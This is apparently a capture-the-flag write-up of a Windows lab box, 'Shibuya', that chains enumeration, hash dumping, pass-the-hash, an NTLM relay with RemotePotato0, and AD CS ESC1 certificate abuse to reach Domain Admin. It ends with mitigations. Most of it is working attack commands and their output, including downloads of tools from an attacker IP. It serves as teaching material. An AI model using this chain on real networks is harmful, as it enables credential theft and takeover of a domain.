---
layout: default
title: "Shibuya — AD CS ESC1 to Domain Admin"
date: 2026-10-04
author: 0xcybersoldier
tags: [active-directory, adcs, esc1, ntlm-relay, pass-the-hash, writeup]
---

# Shibuya — AD CS ESC1 to Domain Admin

<p align="center">
  <img src="{{ '/assets/img/shibuya.png' | relative_url }}" alt="Shibuya" width="260">
</p>

**Difficulty:** Medium · **OS:** Windows Server 2022 · **Domain:** `shibuya.vl`

Shibuya is an Active Directory box that walks through a full enterprise chain:
anonymous SMB enumeration, credentials leaked in an account description, offline
SAM/LSA hash extraction from a leaked WIM image, pass-the-hash, a cross-session
NTLM relay with RemotePotato0, and finally an **AD CS ESC1** certificate abuse to
escalate to Domain Admin.

---

## 1. Recon

```bash
sudo nmap -sCV --min-rate=1000 -T5 -p- 10.129.234.42 -Pn -vvvv
```

Key open ports point straight at a Domain Controller:

| Port | Service |
|------|---------|
| 22 | OpenSSH for Windows 9.5 |
| 53 | DNS (Simple DNS Plus) |
| 88 | Kerberos |
| 135 / 139 / 445 | RPC / NetBIOS / SMB |
| 389 / 3268 / 3269 | LDAP / Global Catalog (+SSL) |
| 464 | kpasswd |
| 593 | RPC over HTTP |
| 3389 | RDP |
| 9389 | AD Web Services |

From the LDAP/RDP certificates we recover the naming:

- **Domain:** `shibuya.vl`
- **DC / host:** `AWSJPDC0522.shibuya.vl`
- **CA:** `shibuya-AWSJPDC0522-CA`  ← note: AD CS is installed

Add the host to `/etc/hosts`:

```bash
echo "10.129.234.42 AWSJPDC0522.shibuya.vl shibuya.vl" | sudo tee -a /etc/hosts
```

---

## 2. SMB & user enumeration

Null authentication is allowed, but shares can't be listed anonymously:

```bash
nxc smb 10.129.234.42 -u '' -p ''          # [+] shibuya.vl\:  (null auth)
nxc smb 10.129.234.42 -u '' -p '' --shares # STATUS_ACCESS_DENIED
```

So we brute valid usernames with Kerbrute:

```bash
/opt/Kerbrute/kerbrute userenum -d shibuya.vl --dc AWSJPDC0522.shibuya.vl \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
[+] VALID USERNAME:  purple@shibuya.vl
[+] VALID USERNAME:  red@shibuya.vl
```

Trying username-as-password, `red:red` is valid (Kerberos auth):

```bash
nxc smb shibuya.vl -u red -p red -k            # [+] shibuya.vl\red:red
nxc smb shibuya.vl -u red -p red -k --shares
```

```
Share       Permissions   Remark
-----       -----------   ------
images$
IPC$        READ          Remote IPC
NETLOGON    READ          Logon server share
SYSVOL      READ          Logon server share
users       READ
```

---

## 3. Credentials in a user description

Enumerating domain users surfaces a service account with its password sitting in
the **Description** field:

```bash
nxc smb shibuya.vl -u red -p red -k --users
```

```
svc_autojoin   2025-02-15 07:51:49   0   K5&A6Dw9d8jrKWhV
```

So:

```
svc_autojoin : K5&A6Dw9d8jrKWhV
```

---

## 4. Looting WIM images from images$

The `images$` share holds deployment WIM files:

```bash
impacket-smbclient -k shibuya.vl/svc_autojoin:'K5&A6Dw9d8jrKWhV'@AWSJPDC0522.shibuya.vl
# use images$
# ls
#   AWSJPWK0222-01.wim / -02.wim / -03.wim / vss-meta.cab
# mget *
```

Mount the OS image and grab the registry hives:

```bash
sudo wimmount AWSJPWK0222-02.wim /mnt
# -> /mnt/.../config contains SAM, SECURITY, SYSTEM
```

Dump the local secrets offline:

```bash
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY local
```

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:...:8dcb5ed323d1d09b9653452027e8c013:::
operator:1000:...:5d8c3d1a20bd63f60f469f6763ca0d50:::

[*] Dumping cached domain logon information
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325
```

The image was captured on a workstation where **`operator`** was the local admin,
and the DCC2 cache tells us **Simon.Watson** logged in there. On this box the
local `operator` NT hash is reused for the domain account `Simon.Watson`.

---

## 5. Foothold — Simon.Watson (user.txt)

Pass-the-hash validates against the DC:

```bash
nxc smb shibuya.vl -u 'Simon.watson' -H 5d8c3d1a20bd63f60f469f6763ca0d50
# [+] shibuya.vl\Simon.watson:5d8c3d1a20bd63f60f469f6763ca0d50
```

Drop an SSH key into Simon's profile and log in:

```bash
ssh-keygen -t ed25519 -f amra
cp amra.pub authorized_keys

impacket-smbclient -k shibuya.vl/'Simon.watson'@AWSJPDC0522.shibuya.vl \
    -hashes :5d8c3d1a20bd63f60f469f6763ca0d50
# use users ; cd simon.watson ; mkdir .ssh ; cd .ssh ; put authorized_keys

ssh -i amra -D 1080 simon.watson@shibuya.vl   # -D 1080 = SOCKS pivot for later
```

```
C:\Users\simon.watson\Desktop> type user.txt
7353156**************************
```

---

## 6. Lateral movement — cross-session relay to Nigel.Mills

An active RDP session belongs to another user. We upload
[RunasCs](https://github.com/antonioCoco/RunasCs) and check sessions:

```powershell
wget http://10.10.16.63/RunasCs.exe -o run.exe -usebasicparsing
.\run.exe -l 9 amra amra qwinsta
```

```
SESSIONNAME   USERNAME        ID  STATE
rdp-tcp#0     nigel.mills     1   Active
```

`nigel.mills` has an interactive session, so a **cross-session NTLM relay** with
[RemotePotato0](https://github.com/antonioCoco/RemotePotato0) will coerce his
authentication. A host firewall only allows inbound 8000–9000, so we relay through
port **8888**.

On Kali, redirect RPC 135 to the victim's 8888:

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8888
```

On the target:

```powershell
wget http://10.10.16.63/RemotePotato0.exe -o Remotepotato.exe -usebasicparsing
.\Remotepotato.exe -m 2 -x 10.10.16.63 -s 1 -p 8888
```

```
[+] User hash stolen!
NTLMv2 Username : SHIBUYA\Nigel.Mills
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:5feac843a734b464:fe02...
```

Crack it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Sail2Boat3  (Nigel.Mills)
```

```
nigel.mills : Sail2Boat3
```

---

## 7. Privilege escalation — AD CS ESC1

SSH in as nigel.mills and check group membership:

```powershell
ssh -D 1080 nigel.mills@shibuya.vl
whoami /groups
# SHIBUYA\t1_admins   S-1-5-21-87560095-894484815-3652015022-1103
```

He's in **`t1_admins`**. Through the SOCKS pivot, hunt for vulnerable templates:

```bash
proxychains certipy-ad find -vulnerable -u nigel.mills -p Sail2Boat3 \
    -dc-ip 127.0.0.1 -stdout
```

```
Template Name : ShibuyaWeb
  Enrollee Supplies Subject : True
  Client Authentication     : True
  Enrollment Rights         : SHIBUYA.VL\t1_admins
  [!] Vulnerabilities
      ESC1 : Enrollee supplies subject and template allows client authentication.
```

The `ShibuyaWeb` template is **ESC1** and `t1_admins` can enroll. Request a cert
impersonating the built-in admin (`_admin`, RID 500), including the `-sid` so it
survives the strong-certificate-mapping patch:

```bash
proxychains certipy-ad req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 \
    -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb \
    -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096 \
    -sid S-1-5-21-87560095-894484815-3652015022-500
# [*] Wrote certificate and private key to '_admin.pfx'
```

Authenticate with the PFX to pull the NT hash:

```bash
proxychains certipy-ad auth -pfx _admin.pfx -dc-ip 127.0.0.1
# [*] Got hash for '_admin@shibuya.vl':
#     aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430
```

---

## 8. Domain Admin (root.txt)

Pass the hash over WinRM (through the pivot) as the built-in admin:

```bash
proxychains evil-winrm -i 127.0.0.1 -u _admin -H bab5b2a004eabb11d865f31912b6b430
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
5b150cc71e974d*******************
```

Owned. :triangular_flag_on_post:

---

## Attack chain summary

1. **Recon** → DC `shibuya.vl`, AD CS installed.
2. **Kerbrute** → users `red`, `purple`; `red:red` logs in.
3. **User desc** leaks `svc_autojoin : K5&A6Dw9d8jrKWhV`.
4. **images$** WIM → offline SAM/LSA dump → `operator` hash + Simon.Watson cache.
5. **Pass-the-hash** as `Simon.Watson` → SSH + `user.txt`.
6. **RemotePotato0** cross-session relay → Nigel.Mills NTLMv2 → cracked `Sail2Boat3`.
7. **AD CS ESC1** on `ShibuyaWeb` (enrollable by `t1_admins`) → `_admin` cert/hash.
8. **Evil-WinRM PtH** → Domain Admin + `root.txt`.

## Mitigations

- Never store passwords in AD object descriptions; audit with tools like
  BloodHound / PingCastle.
- Don't expose deployment WIM images on readable shares — they carry registry
  hives and local secrets.
- Harden AD CS: remove `Enrollee Supplies Subject` from client-auth templates,
  restrict enrollment rights, and enable **Manager Approval** on sensitive
  templates (ESC1 fix).
- Enforce strong certificate mapping (KB5014754) and SMB signing.
